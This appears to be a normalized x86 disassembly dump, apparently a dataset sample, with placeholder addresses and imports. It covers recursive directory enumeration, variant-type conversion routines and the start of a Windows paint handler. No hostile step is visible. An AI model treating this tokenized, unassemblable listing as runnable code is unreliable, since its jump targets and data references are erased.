mov [ ebp + 0xb ] 0x1
sub_409557
mov ecx [ ebp - 0x14 ]
xor ebx ebx
cmp ecx ebx
mov [ ebp - 0x4 ] bl
je r-xdata
lea ecx [ ebp - 0x88 ]
call sub_401a90
mov eax [ ebp - 0x18 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
dec [ ecx + 0x4 ]
jne r-xdata
mov eax [ ecx ]
push 0x1
call [ eax ]
sub_409a30
push ebp
mov ebp esp
push 0xffffffff
push sub_4bed51
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x730
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
mov [ ebp - 0x10 ] esp
push esi
call sub_404440
xor edi edi
add esp 0x4
cmp eax edi
je r-xdata
sub esp 0x1c
mov ecx esp
mov eax esi
mov [ ecx + 0x18 ] 0xf
mov [ ecx + 0x14 ] edi
mov [ ebp - 0x28 ] esp
mov [ ecx + 0x4 ] 0x0
lea ebx [ eax + 0x1 ]
mov esi eax
mov [ ebp + 0x8 ] esi
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
sub eax ebx
push eax
push esi
call sub_401e80
call sub_405090
mov ebx eax
push ebx
call sub_404aa0
add esp 0x20
test eax eax
je r-xdata
or eax 0xffffffff
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x4c ] edi
mov edi [ ebp + 0x24 ]
xor eax eax
cmp edi eax
jne r-xdata
cmp ebx 0x7
ja r-xdata
lea edi [ ebp - 0x4c ]
lea eax [ ebp - 0x304 ]
push eax
push esi
call [ FindFirstFileA@IAT ]
test eax eax
jne r-xdata
jmp [ ebx * 4 + jump_table_40a2f0 ]
push eax
call [ FindClose@IAT ]
mov eax esi
lea edx [ eax + 0x1 ]
mov eax 0xfffffffc
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x48 ]
call sub_4024d0
mov eax [ ebp - 0x30 ]
mov esi [ ebp + 0x18 ]
mov ebx 0x10
cmp eax ebx
mov eax [ ebp - 0x44 ]
mov [ ebp - 0x4 ] 0x0
mov [ esi + 0x1c ] ebx
jae r-xdata
mov [ ebp - 0x14 ] eax
push 0x1
push eax
push eax
push eax
push eax
mov ebx 0x4
mov [ ebp - 0x4 ] ebx
push esi
mov [ ebp - 0x4 ] 0x5
call sub_41c070
add esp 0x18
push eax
lea ecx [ ebp - 0x14 ]
call sub_401020
mov [ ebp - 0x4 ] ebx
mov ebx [ ebp - 0x14 ]
xor esi esi
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x18 ] eax
mov ecx [ rw-data ]
push ecx
lea edx [ ebp - 0x24 ]
push edx
push esi
lea ecx [ ebp - 0x11c ]
mov [ ebp - 0x4 ] 0x7
call sub_403030
lea eax [ ebp - 0x11c ]
push eax
mov [ ebp - 0x4 ] 0x8
mov [ ebp - 0xf8 ] 0x2
call sub_4090d0
add esp 0x4
test eax eax
jl r-xdata
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x18 ] eax
mov edx [ rw-data ]
push edx
lea eax [ ebp - 0x24 ]
push eax
push esi
lea ecx [ ebp - 0x11c ]
mov [ ebp - 0x4 ] 0x9
call sub_403030
lea ecx [ ebp - 0x11c ]
push ecx
mov [ ebp - 0x4 ] 0xa
mov [ ebp - 0xf8 ] 0x2
call sub_4090d0
add esp 0x4
test eax eax
jl r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov esi [ ebp + 0x18 ]
sub eax edx
push eax
push ecx
mov ecx esi
call sub_401e80
mov eax [ ebp - 0x2e4 ]
mov edx [ ebp - 0x304 ]
mov ecx [ ebp - 0x2e8 ]
mov [ esi + 0x20 ] eax
mov eax [ ebp - 0x2ec ]
mov [ esi + 0x2c ] eax
or eax 0xffffffff
mov [ esi + 0x1c ] edx
mov edx [ ebp - 0x2f0 ]
mov [ esi + 0x24 ] ecx
mov ecx [ ebp + 0xc ]
mov [ esi + 0x30 ] eax
mov [ esi + 0x3c ] eax
xor eax eax
mov [ esi + 0x28 ] edx
mov [ esi + 0x40 ] eax
mov [ esi + 0x44 ] ecx
mov [ esi + 0x4c ] eax
mov [ esi + 0x50 ] eax
push eax
call sub_457f00
add esp 0x4
test eax eax
jle r-xdata
lea eax [ ebp - 0x44 ]
mov [ eax ] ebx
call [ rw-data ]
test eax eax
jne r-xdata
inc [ ebx + 0x4 ]
lea ecx [ ebp - 0x11c ]
call sub_401a00
lea ecx [ ebp - 0x24 ]
call sub_403b20
lea ecx [ ebp - 0x24 ]
call sub_4010f0
test eax eax
je r-xdata
xor ebx ebx
mov [ ebp - 0x14 ] ebx
jmp r-xdata
push r--data
lea ecx [ ebp - 0x48 ]
call sub_402010
cmp [ ebp - 0x30 ] ebx
mov eax [ ebp - 0x44 ]
jae r-xdata
push 0x5c
push 0x1
lea ecx [ ebp - 0x48 ]
call sub_4017f0
test ebx ebx
push ecx
mov [ ebp - 0x2c ] esp
mov eax esp
je r-xdata
lea edx [ ebp - 0x704 ]
push edx
call sub_439280
add esp 0x4
cmp eax 0x7
je r-xdata
mov esi [ ebp + 0xc ]
test esi esi
jge r-xdata
mov esi [ ebp - 0x20 ]
test esi esi
jne r-xdata
lea ecx [ ebp - 0x1a8 ]
push ecx
push eax
call [ FindFirstFileA@IAT ]
cmp eax 0xffffffff
mov [ ebp - 0x14 ] eax
lea ecx [ ebp - 0x48 ]
je r-xdata
lea eax [ ebp - 0x44 ]
mov [ eax ] ebx
call [ rw-data ]
test ebx ebx
mov [ ebp - 0x4 ] 0xffffffff
je r-xdata
inc [ ebx + 0x4 ]
inc esi
jmp r-xdata
mov edx [ edi ]
mov eax [ ebp + 0xc ]
inc edx
mov ecx edx
cmp ecx eax
mov [ edi ] edx
jg r-xdata
lea ecx [ ebp - 0x24 ]
call sub_4010f0
cmp esi eax
jl r-xdata
xor esi esi
jmp r-xdata
mov ecx [ ebp - 0x1c ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
add edx eax
xor edx edx
jmp r-xdata
call sub_4480e0
or eax 0xffffffff
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x34 ]
dec edx
push edx
call sub_401f60
xor eax eax
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x18 ] eax
mov ebx [ ebp + 0xc ]
mov [ ebp - 0x4 ] 0x1
or eax 0xffffffff
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
dec [ ebx + 0x4 ]
jne r-xdata
test ebx ebx
lea ecx [ ebp - 0x73c ]
push ecx
push esi
push ecx
mov [ ebp - 0x28 ] esi
mov [ ebp - 0x2c ] esp
mov eax esp
je r-xdata
mov al [ ebp - 0x704 ]
test al al
lea edi [ ebp - 0x704 ]
je r-xdata
mov ecx [ ebp + 0x20 ]
imul esi esi 0x70
mov edx [ ebp + 0x1c ]
mov eax [ ebp + 0x14 ]
mov edi [ ebp - 0x20 ]
push ecx
mov ecx [ ebp + 0x10 ]
push edx
push eax
add esi edi
push ecx
push esi
jmp r-xdata
lea ecx [ ebp - 0x24 ]
call sub_4010f0
mov esi eax
dec esi
test esi esi
jne r-xdata
cmp [ esi + ebx + 0x18 ] 0x10
jb r-xdata
cmp [ ebp - 0x14 ] edx
jge r-xdata
mov eax [ ebp - 0x14 ]
lea edx [ ebp - 0x1a8 ]
push edx
push eax
call [ FindNextFileA@IAT ]
test eax eax
jne r-xdata
push r--data
lea ecx [ ebp - 0x17c ]
push ecx
call [ lstrcmpA@IAT ]
test eax eax
je r-xdata
mov edx [ ebx ]
push 0x1
mov ecx ebx
call [ edx ]
mov edx [ ebp + 0x8 ]
mov esi [ ebp + 0x18 ]
push edx
mov ecx esi
call sub_402510
push r--data
mov ecx esi
call sub_402010
lea eax [ ebp - 0x704 ]
push eax
mov ecx esi
call sub_402010
mov ecx [ ebp - 0x738 ]
mov eax [ ebp - 0x720 ]
mov edx [ ebp - 0x724 ]
mov [ esi + 0x1c ] ecx
mov ecx [ ebp - 0x714 ]
mov [ esi + 0x24 ] eax
mov eax [ ebp - 0x28 ]
mov [ esi + 0x20 ] edx
mov edx [ ebp - 0x710 ]
mov [ esi + 0x28 ] ecx
mov ecx [ ebp + 0x20 ]
push ecx
mov ecx [ ebp + 0x10 ]
mov [ esi + 0x44 ] eax
xor eax eax
mov [ esi + 0x2c ] edx
mov edx [ ebp + 0x1c ]
push edx
mov [ esi + 0x4c ] eax
mov [ esi + 0x50 ] eax
mov eax [ ebp + 0x14 ]
push eax
push ecx
or edi 0xffffffff
push esi
mov [ esi + 0x30 ] edi
mov [ esi + 0x3c ] edi
mov [ esi + 0x40 ] 0x3
call sub_4053a0
add esp 0x10
test ebx ebx
mov esi eax
mov [ ebp - 0x2c ] esp
mov eax esp
je r-xdata
lea ebx [ ebx ]
call sub_4053a0
add esp 0x14
lea ecx [ ebp - 0x11c ]
mov esi eax
call sub_401a00
lea ecx [ ebp - 0x24 ]
call sub_403b20
mov ecx [ ebp - 0x1c ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
add edx eax
xor edx edx
jmp r-xdata
lea esi [ esi + ebx + 0x4 ]
mov esi [ esi + ebx + 0x4 ]
jmp r-xdata
push r--data
lea eax [ ebp - 0x17c ]
push eax
call [ lstrcmpA@IAT ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x14 ]
push ecx
call [ FindClose@IAT ]
lea ecx [ ebp - 0x24 ]
call sub_4010f0
test eax eax
je r-xdata
lea edx [ ebp - 0x17c ]
push edx
call sub_439280
add esp 0x4
cmp eax 0x7
je r-xdata
mov [ eax ] ebx
call [ rw-data ]
test ebx ebx
mov [ ebp - 0x4 ] edi
je r-xdata
inc [ ebx + 0x4 ]
cmp al 0x5c
jne r-xdata
inc edi
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov ecx [ ebp + 0x20 ]
imul eax eax 0x70
mov edx [ ebp + 0x1c ]
push ecx
mov ecx [ ebp + 0x14 ]
push edx
mov edx [ ebp + 0x10 ]
push ecx
add eax esi
push edx
push eax
mov eax [ ebp - 0x14 ]
dec edx
cmp eax edx
jne r-xdata
inc [ ebp - 0x14 ]
add ebx 0x70
jmp r-xdata
inc [ edi ]
mov ecx [ ebp + 0xc ]
cmp [ edi ] ecx
jg r-xdata
push esi
call sub_439280
add esp 0x4
cmp eax 0x7
je r-xdata
push r--data
lea ecx [ ebp - 0x48 ]
call sub_402010
cmp [ ebp - 0x30 ] 0x10
mov eax [ ebp - 0x44 ]
jae r-xdata
cmp [ edi ] ebx
jle r-xdata
lea eax [ ebp - 0x17c ]
push eax
lea ecx [ ebp - 0x48 ]
push ecx
lea edx [ ebp - 0x1c4 ]
push edx
call sub_402140
add esp 0xc
push 0xffffffff
push 0x0
push eax
mov ecx esi
mov [ ebp - 0x4 ] 0x2
call sub_401dd0
lea ecx [ ebp - 0x1c4 ]
mov [ ebp - 0x4 ] 0x1
call sub_4480e0
mov eax [ ebp - 0x1a8 ]
mov ecx [ ebp - 0x188 ]
mov edx [ ebp - 0x18c ]
mov [ esi + 0x1c ] eax
mov eax [ ebp - 0x194 ]
mov [ esi + 0x28 ] eax
or eax 0xffffffff
mov [ esi + 0x20 ] ecx
mov ecx [ ebp - 0x190 ]
mov [ esi + 0x30 ] eax
mov [ esi + 0x3c ] eax
xor eax eax
mov [ esi + 0x2c ] ecx
mov [ esi + 0x24 ] edx
mov [ esi + 0x40 ] eax
mov edx [ edi ]
push esi
lea ecx [ ebp - 0x24 ]
mov [ esi + 0x44 ] edx
mov [ esi + 0x4c ] eax
mov [ esi + 0x50 ] eax
call sub_407bb0
mov edx [ edi ]
inc edx
test ebx ebx
mov [ edi ] edx
mov eax edx
jl r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
dec [ ebx + 0x4 ]
jne r-xdata
mov al [ edi + 0x1 ]
inc edi
test al al
jne r-xdata
mov [ edi ] 0x2f
mov esi [ ebp - 0x20 ]
lea edx [ ebp - 0x1a8 ]
push edx
push eax
call [ FindFirstFileA@IAT ]
cmp eax 0xffffffff
mov [ ebp - 0x14 ] eax
je r-xdata
lea eax [ ebp - 0x44 ]
test ebx ebx
jge r-xdata
lea ecx [ ebx + 0x1 ]
cmp eax ecx
je r-xdata
mov edx [ ebx ]
push 0x1
mov ecx ebx
call [ edx ]
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov al [ edi ]
mov cl al
xor cl 0x20
add cl 0x5f
cmp cl 0x3b
ja r-xdata
lea ecx [ ebp - 0x24 ]
call sub_403b20
lea ecx [ ebp - 0x48 ]
mov eax [ ebp - 0x34 ]
dec eax
push eax
lea ecx [ ebp - 0x48 ]
call sub_401f60
lea esp [ esp ]
lea ecx [ ebp - 0x24 ]
call sub_403b20
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x4 ] 0xffffffff
call sub_4480e0
jmp r-xdata
mov edx [ rw-data ]
push edx
lea eax [ ebp - 0x24 ]
push eax
call sub_481f30
mov ecx [ ebp - 0x20 ]
add esp 0x8
push ecx
mov ecx esi
call sub_402540
mov ecx [ ebp - 0x14 ]
lea eax [ ebp - 0x1a8 ]
push eax
push ecx
call [ FindNextFileA@IAT ]
test eax eax
jne r-xdata
push r--data
lea edx [ ebp - 0x17c ]
push edx
call [ lstrcmpA@IAT ]
test eax eax
je r-xdata
mov edx [ ebp + 0x20 ]
mov eax [ ebp + 0x1c ]
mov ecx [ ebp + 0x14 ]
push edx
mov edx [ ebp + 0x10 ]
push eax
push ecx
push edx
push esi
call sub_4053a0
mov ecx [ ebp - 0xc ]
add esp 0x14
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn
push r--data
lea ecx [ ebp - 0x17c ]
push ecx
call [ lstrcmpA@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0x14 ]
push eax
call [ FindClose@IAT ]
mov [ esi + 0x1c ] 0x10
lea eax [ ebp - 0x48 ]
push eax
lea ecx [ ebp - 0x68 ]
call sub_401fc0
mov ecx [ ebp - 0x34 ]
dec ecx
push ecx
lea ecx [ ebp - 0x68 ]
mov [ ebp - 0x4 ] 0x3
call sub_401f60
push r--data
lea ecx [ ebp - 0x68 ]
call sub_402010
lea edx [ ebp - 0x17c ]
push edx
lea ecx [ ebp - 0x68 ]
call sub_402010
cmp [ ebp - 0x50 ] 0x10
mov eax [ ebp - 0x64 ]
jae r-xdata
sub esp 0x1c
mov ecx esp
mov [ ebp - 0x28 ] esp
push eax
call sub_4024d0
call sub_405090
add esp 0x1c
cmp eax 0x7
je r-xdata
lea eax [ ebp - 0x64 ]
lea ecx [ ebp - 0x68 ]
mov [ ebp - 0x4 ] 0x1
call sub_4480e0
cmp eax 0x6
je r-xdata
mov eax [ ebp + 0x24 ]
test eax eax
jne r-xdata
cmp [ ebp - 0x50 ] 0x10
mov eax [ ebp - 0x64 ]
jae r-xdata
mov ecx [ ebp + 0x20 ]
mov edx [ ebp + 0x1c ]
push edi
push ecx
mov ecx [ ebp + 0x14 ]
push edx
mov edx [ ebp + 0x10 ]
push esi
push ecx
push edx
push ebx
push eax
call sub_409a30
mov [ ebp - 0x28 ] eax
mov eax [ edi ]
add esp 0x20
cmp ebx eax
jl r-xdata
lea eax [ ebp - 0x64 ]
mov edx [ ebp - 0x14 ]
push edx
call [ FindClose@IAT ]
lea ecx [ ebp - 0x68 ]
call sub_4480e0
lea ecx [ ebp - 0x24 ]
call sub_403b20
lea ecx [ ebp - 0x48 ]
call sub_4480e0
mov eax [ ebp - 0x28 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40a380
mov eax [ esp + 0x4 ]
mov edx [ eax ]
test edx edx
je r-xdata
mov eax [ ecx ]
test eax eax
je r-xdata
inc [ edx ]
mov [ ecx ] edx
retn 0x4
push esi
cmp [ eax ] 0x1
jne r-xdata
dec [ eax ]
pop esi
mov esi [ eax + 0x4 ]
dec [ esi + 0xc ]
sub_40a400
push ecx
cmp [ ecx ] 0x63
mov [ esp ] 0x0
jne r-xdata
mov eax [ esp + 0x8 ]
xor ecx ecx
mov [ eax ] ecx
pop ecx
retn 0x4
mov ecx [ ecx + 0x4 ]
test ecx ecx
je r-xdata
mov eax [ esp + 0x8 ]
mov [ eax ] ecx
pop ecx
retn 0x4
inc [ ecx + 0x4 ]
sub_40a4d0
mov eax [ ecx ]
cmp eax 0x80000001
je r-xdata
mov eax [ ecx + 0x4 ]
test eax eax
setne al
retn
cmp eax 0x80000002
je r-xdata
fld [ ecx + 0x4 ]
fcomp [ r--data ]
fnstsw ax
test ah 0x44
jpe r-xdata
mov al [ ecx + 0x4 ]
retn
mov al 0x1
retn
xor al al
retn
sub_40a510
mov eax [ ecx ]
sub esp 0x8
cmp eax 0xc
ja r-xdata
cmp eax 0x80000001
jne r-xdata
jmp [ eax * 4 + jump_table_40a5a4 ]
fld [ ecx + 0x4 ]
add esp 0x8
jmp sub_4b64c4
mov eax [ ecx + 0x4 ]
add esp 0x8
retn
call sub_4aa0c0
add esp 0x8
retn
call sub_4aa0e0
add esp 0x8
retn
call sub_4aa1d0
add esp 0x8
retn
call sub_4aa2f0
add esp 0x8
retn
call sub_4aa500
add esp 0x8
retn
lea eax [ esp ]
push eax
call sub_4aa550
mov eax [ eax ]
add esp 0x8
retn
call sub_4aa0f0
add esp 0x8
retn
call sub_4aa150
add esp 0x8
retn
call sub_4aa080
add esp 0x8
retn
call sub_4aa0a0
add esp 0x8
retn
call sub_4aa1b0
add esp 0x8
retn
sub_40a5e0
mov eax [ ecx ]
sub esp 0x8
cmp eax 0xc
ja r-xdata
cmp eax 0x80000001
jne r-xdata
jmp [ eax * 4 + jump_table_40a6d0 ]
fld [ ecx + 0x4 ]
fild [ ecx + 0x4 ]
add esp 0x8
retn
call sub_4aa0c0
mov [ esp ] eax
fild [ esp ]
add esp 0x8
retn
call sub_4aa0e0
mov [ esp ] eax
fild [ esp ]
add esp 0x8
retn
call sub_4aa1d0
mov [ esp ] eax
fild [ esp ]
add esp 0x8
retn
call sub_4aa2f0
mov [ esp ] eax
fild [ esp ]
add esp 0x8
retn
call sub_4aa500
mov [ esp ] eax
fild [ esp ]
add esp 0x8
retn
lea eax [ esp ]
push eax
call sub_4aa550
fild [ eax ]
mov ecx [ eax ]
test ecx ecx
jge r-xdata
call sub_4aa0f0
mov [ esp ] eax
fild [ esp ]
add esp 0x8
retn
call sub_4aa150
mov [ esp ] eax
fild [ esp ]
add esp 0x8
retn
call sub_4aa080
mov [ esp ] eax
fild [ esp ]
add esp 0x8
retn
call sub_4aa0a0
mov [ esp ] eax
fild [ esp ]
add esp 0x8
retn
call sub_4aa1b0
mov [ esp ] eax
fild [ esp ]
add esp 0x8
retn
add esp 0x8
retn
fadd [ r--data ]
add esp 0x8
retn
sub_40a760
push 0xffffffff
push sub_4bed7b
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push ebp
push esi
mov esi ecx
mov [ esp + 0x8 ] esi
xor eax eax
mov [ esp + 0x14 ] eax
mov [ esi + 0x4 ] eax
mov [ esi ] r--data
mov [ esi + 0x38 ] eax
mov ebp [ esp + 0x1c ]
cmp ebp eax
mov [ esp + 0x14 ] 0x2
je r-xdata
mov ecx [ esi + 0x38 ]
cmp ecx eax
je r-xdata
inc [ ebp + 0x4 ]
push ebx
push edi
mov [ esi + 0x38 ] ebp
lea ebx [ esi + 0x8 ]
xor eax eax
mov ecx 0xc
mov edi ebx
[ edi ]
mov eax [ esi + 0x38 ]
mov ecx [ eax ]
push eax
call [ ecx + 0x10 ]
mov edx [ eax ]
mov eax [ esi + 0x38 ]
mov [ ebx ] edx
mov ecx [ eax ]
push eax
call [ ecx + 0x10 ]
mov edx [ eax + 0x4 ]
mov eax [ esi + 0x38 ]
mov [ esi + 0xc ] edx
mov ecx [ eax ]
push eax
call [ ecx + 0x10 ]
mov edx [ eax + 0x8 ]
mov eax [ esi + 0x38 ]
mov [ esi + 0x10 ] edx
mov ecx [ eax ]
push eax
call [ ecx + 0x10 ]
mov edx [ eax + 0xc ]
mov eax [ esi + 0x38 ]
mov [ esi + 0x14 ] edx
mov ecx [ eax ]
push eax
call [ ecx + 0x10 ]
mov edx [ eax + 0x10 ]
mov eax [ esi + 0x38 ]
mov [ esi + 0x18 ] edx
mov ecx [ eax ]
push eax
call [ ecx + 0x10 ]
cmp [ eax + 0x14 ] 0x13
jne r-xdata
dec [ ecx + 0x4 ]
jne r-xdata
mov eax [ esi + 0x38 ]
mov edx [ eax ]
push eax
call [ edx + 0x10 ]
cmp [ eax + 0x14 ] 0x14
jne r-xdata
mov [ esi + 0x1c ] 0x50000001
jmp r-xdata
mov eax [ ecx ]
push 0x1
call [ eax + 0x14 ]
mov eax [ esi + 0x38 ]
mov ecx [ eax ]
push eax
call [ ecx + 0x10 ]
mov bl [ eax + 0x14 ]
xor edx edx
cmp bl 0x22
setne dl
dec edx
and edx 0x60000004
mov [ esi + 0x1c ] edx
mov [ esi + 0x1c ] 0x50000002
jmp r-xdata
test ebp ebp
pop edi
mov [ esp + 0x18 ] 0xffffffff
pop ebx
je r-xdata
mov ecx [ esp + 0xc ]
mov eax esi
pop esi
pop ebp
mov [ fs : 0x0 ] ecx
add esp 0x10
retn 0x4
dec [ ebp + 0x4 ]
jne r-xdata
mov eax [ ebp ]
push 0x1
mov ecx ebp
call [ eax + 0x14 ]
sub_40a890
push ecx
mov edx [ esp + 0x14 ]
mov eax [ esp + 0x8 ]
mov eax [ eax + 0x38 ]
mov ecx [ eax ]
push edx
mov edx [ esp + 0x14 ]
push edx
lea edx [ esp + 0x10 ]
push edx
push eax
mov [ esp + 0x10 ] 0x0
call [ ecx + 0x4 ]
mov ecx [ eax ]
test ecx ecx
je r-xdata
mov eax [ esp + 0x8 ]
test eax eax
je r-xdata
inc [ ecx ]
test ecx ecx
je r-xdata
cmp [ eax ] 0x1
mov edx eax
jne r-xdata
test ecx ecx
mov eax [ esp + 0xc ]
mov [ eax ] ecx
je r-xdata
inc [ ecx ]
dec [ edx ]
mov eax [ eax + 0x4 ]
dec [ eax + 0xc ]
pop ecx
retn 0x10
cmp [ ecx ] 0x1
jne r-xdata
dec [ ecx ]
mov edx [ ecx + 0x4 ]
dec [ edx + 0xc ]
sub_40a950
push 0xffffffff
push sub_4bed98
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
mov [ esp + 0x4 ] esi
mov [ esi ] r--data
mov ecx [ esi + 0x38 ]
test ecx ecx
mov [ esp + 0x10 ] 0x0
je r-xdata
mov ecx [ esp + 0x8 ]
mov [ esi ] r--data
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
dec [ ecx + 0x4 ]
jne r-xdata
mov eax [ ecx ]
push 0x1
call [ eax + 0x14 ]
sub_40a9b0
push 0xffffffff
push sub_4bedcb
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push ebp
push esi
mov esi ecx
mov [ esp + 0x8 ] esi
xor eax eax
mov [ esp + 0x14 ] eax
mov [ esi + 0x4 ] eax
mov [ esi ] r--data
mov [ esi + 0x2c ] eax
mov ebp [ esp + 0x1c ]
cmp ebp eax
mov [ esp + 0x14 ] 0x2
je r-xdata
mov ecx [ esi + 0x2c ]
cmp ecx eax
je r-xdata
inc [ ebp + 0x4 ]
push ebx
push edi
mov [ esi + 0x2c ] ebp
lea ebx [ esi + 0x8 ]
xor eax eax
mov ecx 0x9
mov edi ebx
[ edi ]
mov eax [ esi + 0x2c ]
mov ecx [ eax ]
push eax
call [ ecx + 0x14 ]
mov edx [ eax ]
mov eax [ esi + 0x2c ]
mov [ ebx ] edx
mov ecx [ eax ]
push eax
call [ ecx + 0x14 ]
mov edx [ eax + 0x4 ]
mov eax [ esi + 0x2c ]
mov [ esi + 0xc ] edx
mov ecx [ eax ]
push eax
call [ ecx + 0x14 ]
mov edx [ eax + 0x8 ]
mov eax [ esi + 0x2c ]
mov [ esi + 0x10 ] edx
mov ecx [ eax ]
push eax
call [ ecx + 0x14 ]
mov edx [ eax + 0xc ]
mov eax [ esi + 0x2c ]
mov [ esi + 0x14 ] edx
mov ecx [ eax ]
push eax
call [ ecx + 0x14 ]
mov edx [ eax + 0x10 ]
mov eax [ esi + 0x2c ]
mov [ esi + 0x18 ] edx
mov ecx [ eax ]
push eax
call [ ecx + 0x14 ]
mov edx [ eax + 0x14 ]
and edx 0x50000001
cmp edx 0x50000001
pop edi
pop ebx
jne r-xdata
dec [ ecx + 0x4 ]
jne r-xdata
mov eax [ esi + 0x2c ]
mov ecx [ eax ]
push eax
call [ ecx + 0x14 ]
mov edx [ eax + 0x14 ]
and edx 0x50000002
cmp edx 0x50000002
jne r-xdata
mov [ esi + 0x1c ] 0x13
jmp r-xdata
mov eax [ ecx ]
push 0x1
call [ eax + 0x18 ]
mov eax [ esi + 0x2c ]
mov ecx [ eax ]
push eax
call [ ecx + 0x14 ]
mov edx [ eax + 0x14 ]
and edx 0x60000004
cmp edx 0x60000004
setne al
dec al
and eax 0x22
mov [ esi + 0x1c ] al
mov [ esi + 0x1c ] 0x14
jmp r-xdata
test ebp ebp
mov [ esp + 0x14 ] 0xffffffff
je r-xdata
mov ecx [ esp + 0xc ]
mov eax esi
pop esi
pop ebp
mov [ fs : 0x0 ] ecx
add esp 0x10
retn 0x4
dec [ ebp + 0x4 ]
jne r-xdata
mov edx [ ebp ]
push 0x1
mov ecx ebp
call [ edx + 0x18 ]
sub_40ab00
push ecx
mov edx [ esp + 0x14 ]
mov eax [ esp + 0x8 ]
mov eax [ eax + 0x2c ]
mov ecx [ eax ]
push edx
mov edx [ esp + 0x14 ]
push edx
lea edx [ esp + 0x10 ]
push edx
push eax
mov [ esp + 0x10 ] 0x0
call [ ecx + 0x4 ]
mov ecx [ eax ]
test ecx ecx
je r-xdata
mov eax [ esp + 0x8 ]
test eax eax
je r-xdata
inc [ ecx ]
test ecx ecx
je r-xdata
cmp [ eax ] 0x1
mov edx eax
jne r-xdata
test ecx ecx
mov eax [ esp + 0xc ]
mov [ eax ] ecx
je r-xdata
inc [ ecx ]
dec [ edx ]
mov eax [ eax + 0x4 ]
dec [ eax + 0xc ]
pop ecx
retn 0x10
cmp [ ecx ] 0x1
jne r-xdata
dec [ ecx ]
mov edx [ ecx + 0x4 ]
dec [ edx + 0xc ]
sub_40aba0
push 0xffffffff
push sub_4bede8
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
mov [ esp + 0x4 ] esi
mov [ esi ] r--data
mov ecx [ esi + 0x2c ]
test ecx ecx
mov [ esp + 0x10 ] 0x0
je r-xdata
mov ecx [ esp + 0x8 ]
mov [ esi ] r--data
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
dec [ ecx + 0x4 ]
jne r-xdata
mov eax [ ecx ]
push 0x1
call [ eax + 0x18 ]
sub_40ac10
push esi
push edi
mov edi [ esp + 0xc ]
push edi
mov esi ecx
call sub_4b66db
mov [ esi ] eax
xor eax eax
add esp 0x4
mov [ esi + 0x4 ] edi
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] eax
pop edi
mov eax esi
pop esi
retn 0x4
sub_40ac50
mov edx [ esp + 0x8 ]
mov eax ecx
mov ecx [ esp + 0x4 ]
mov [ eax + 0x8 ] edx
mov edx [ esp + 0xc ]
mov [ eax + 0xc ] edx
mov edx [ esp + 0x10 ]
mov [ eax + 0x10 ] edx
mov edx [ esp + 0x14 ]
mov [ eax + 0x14 ] edx
mov edx [ esp + 0x18 ]
mov [ eax + 0x18 ] edx
mov edx [ esp + 0x1c ]
mov [ eax + 0x1c ] edx
mov edx [ esp + 0x20 ]
mov [ eax + 0x20 ] edx
mov [ eax + 0x4 ] ecx
mov [ eax ] 0x0
inc [ ecx + 0xc ]
retn 0x20
sub_40acd0
mov eax [ esp + 0x8 ]
sub esp 0x2b8
cmp eax 0xf
push ebx
push esi
push edi
je r-xdata
mov edi [ esp + 0x2c8 ]
push ebp
lea edx [ esp + 0x88 ]
push edx
push edi
call [ BeginPaint@IAT ]
mov esi eax
lea eax [ esp + 0x1c8 ]
push eax
push 0x100
push esi
call [ GetTextFaceA@IAT ]
lea ecx [ esp + 0x50 ]
push ecx
push esi
call [ GetTextMetricsA@IAT ]
mov edx [ esp + 0x50 ]
mov eax [ esp + 0x6c ]
xor ebx ebx
lea ecx [ esp + 0x1c8 ]
mov [ esp + 0x14 ] edx
push ecx
lea edx [ esp + 0x34 ]
push edx
mov [ esp + 0x20 ] ebx
mov [ esp + 0x24 ] ebx
mov [ esp + 0x28 ] ebx
mov [ esp + 0x2c ] eax
mov [ esp + 0x30 ] bl
mov [ esp + 0x31 ] 0x1
